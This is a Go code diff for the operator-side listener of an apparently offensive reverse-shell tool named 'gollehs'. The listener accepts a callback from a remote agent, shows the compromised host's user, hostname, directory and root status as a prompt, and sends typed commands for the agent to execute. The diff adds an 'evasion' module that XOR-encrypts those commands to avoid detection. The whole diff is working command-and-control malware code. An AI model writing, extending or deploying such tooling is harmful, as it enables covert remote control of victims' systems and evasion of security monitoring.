@@ -7,13 +7,16 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 
 	"github.com/fatih/color"
+	"github.com/s-christian/gollehs/lib/evasion"
 	"github.com/s-christian/gollehs/lib/logger"
 	"github.com/s-christian/gollehs/lib/utils"
 	"github.com/s-christian/gollehs/types"
+	//"github.com/google/uuid"
 )
 
 const (
@@ -41,15 +44,15 @@ func main() {
 
 	logger.Logf(logger.Info, "Server listening on %s\n", listener.Addr().String())
 
-	for {
-		conn, err := listener.AcceptTCP()
-		if err != nil {
-			logger.Logf(logger.Error, "Listener could not accept connection on %s\n", listener.Addr().String())
-			logger.LogError(err)
-			continue
-		}
-		handleConnection(conn) // intentionally no concurrency (yet)
+	// for {
+	conn, err := listener.AcceptTCP()
+	if err != nil {
+		logger.Logf(logger.Error, "Listener could not accept connection on %s\n", listener.Addr().String())
+		logger.LogError(err)
+		// continue
 	}
+	handleConnection(conn) // intentionally no concurrency (yet)
+	// }
 }
 
 func handleConnection(conn *net.TCPConn) {
@@ -68,13 +71,21 @@ func handleConnection(conn *net.TCPConn) {
 		statusWarning.Printf("WARNING: Could not decode agent data | %s\n", err.Error())
 	}
 
+	fmt.Println()
+	agentCallback.PrintTable()
+	fmt.Println()
+
 	// Catch CTRL+C
-	c := make(chan os.Signal, 2)
+	c := make(chan os.Signal, 1)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
-		<-c
-		_catchInterrupt(agentCallback)
+		// Catch every interrupt, not just the first one
+		for {
+			<-c // blocks until c has something in it, then drains it
+			_catchInterrupt(agentCallback)
+		}
 	}()
+	defer signal.Stop(c)
 
 	for {
 		userInput, err := getUserInput(agentCallback)
@@ -82,47 +93,32 @@ func handleConnection(conn *net.TCPConn) {
 			statusError.Printf("ERROR: Could not get user input | %s\n", err.Error())
 			continue
 		}
-
-		// Send commands through connection for agent to execute
-		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
-		bytesSent, err := conn.Write([]byte(userInput))
-		if err != nil {
-			statusError.Printf("ERROR: Could not send command to agent! | %s\n", err.Error())
+		if len(userInput) == 0 {
+			statusWarning.Printf("WARNING: EOF received, no input\n")
 			continue
 		}
 
-		if bytesSent < len(userInput) {
-			statusError.Printf("ERROR: Only sent %d of %d bytes to agent!\n", bytesSent, len(userInput))
-			continue
-		}
-
-		//statusDone.Printf("Command sent! - '%s'\n", userInput)
-
-		/*
-			dataBuffer := make([]byte, 8192)
-			err = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-			if err != nil {
-				logger.LogError(err)
-				return
-			}
-		*/
-	}
-
-	/*
-		numBytes, err := conn.Read(dataBuffer)
-		if err != nil {
-			logger.Logf(logger.Error, "No data read from %s, closing\n", conn.RemoteAddr().String())
-			logger.LogError(err)
+		// Handle keyword commands
+		switch userInput {
+		case KeywordExit:
 			return
 		}
 
-		logger.Logf(logger.Debug, "Data (%d bytes) is: '%s'\n", numBytes, string(dataBuffer))
+		encryptedInput := evasion.XorEncryptDecryptBytes([]byte(userInput))
 
-		// Shouldn't ever technically be greater than, but adding just in case
-		if numBytes >= len(dataBuffer) {
-			logger.Log(logger.Warning, "Buffer is at maximum capacity, expect data to have been lost in transmission")
+		// Send commands through connection for agent to execute
+		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+		bytesSent, err := conn.Write(encryptedInput)
+		if err != nil {
+			statusError.Printf("ERROR: Could not send command to agent! | %s\n", err.Error())
+			return
 		}
-	*/
+
+		if bytesSent < len(encryptedInput) {
+			statusError.Printf("ERROR: Only sent %d of %d bytes to agent!\n", bytesSent, len(encryptedInput))
+			continue
+		}
+	}
 }
 
 /*
@@ -131,24 +127,23 @@ func handleConnection(conn *net.TCPConn) {
 func getUserInput(agentCallback *types.AgentCallback) (string, error) {
 	scanner := bufio.NewScanner(os.Stdin)
 
-	for {
-		_printPrompt(agentCallback)
+	_printPrompt(agentCallback)
 
-		scanner.Scan()
+	for scanner.Scan() {
 		if err := scanner.Err(); err != nil {
 			return "", err
 		}
 
-		input := scanner.Text()
+		input := strings.TrimSpace(scanner.Text())
 
 		if len(input) != 0 {
-			if input == KeywordExit {
-				os.Exit(0)
-			} else {
-				return input, nil
-			}
+			return input, nil
 		}
+
+		_printPrompt(agentCallback)
 	}
+
+	return "", nil
 }
 
 /*
@@ -157,10 +152,15 @@ func getUserInput(agentCallback *types.AgentCallback) (string, error) {
 	"user@hostname:~/Documents/Projects/Go/gollehs$ "
 */
 func _printPrompt(agentCallback *types.AgentCallback) {
-	fmt.Printf("%s:%s",
-		color.New(color.FgWhite, color.Bold).Sprintf("%s@%s", agentCallback.Username, agentCallback.Hostname),
-		color.New(color.FgGreen, color.Italic).Sprint(agentCallback.Cwd),
-	)
+	userColor := color.New(color.FgWhite, color.Bold)
+	spacerColor := color.New(color.FgHiBlack)
+	cwdColor := color.New(color.FgGreen, color.Italic)
+
+	userColor.Print(agentCallback.Username)
+	spacerColor.Print("@")
+	userColor.Print(agentCallback.Hostname)
+	spacerColor.Print(":")
+	cwdColor.Print(agentCallback.Cwd)
 
 	// Root or non-root prompt symbols
 	if agentCallback.UID == "0" {
